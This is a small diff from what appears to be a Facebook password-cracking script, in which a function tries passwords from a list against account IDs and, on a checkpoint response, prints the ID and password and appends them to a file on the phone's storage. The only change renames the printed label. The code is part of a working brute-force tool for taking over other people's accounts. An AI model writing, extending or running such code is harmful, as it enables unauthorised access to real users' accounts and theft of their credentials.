@@ -667,7 +667,7 @@ def M1(ids,names,passlist):
                                                 break
                                 elif 'www.facebook.com' in q['error']['message']:
                                         if 'y' in pcp:
-                                                print('\r\r\x1b[1;91m [HANDSOME-CP] '+ids+' | '+pas+'\033[1;97m')
+                                                print('\r\r\x1b[1;91m [HASIYA_MA_DHAR_LAGENA] '+ids+' | '+pas+'\033[1;97m')
                                                 open('/sdcard/FILE_BANA_YESLE.txt', 'a').write(ids+'|'+pas+'\n')
                                                 cps.append(ids)
                                                 break
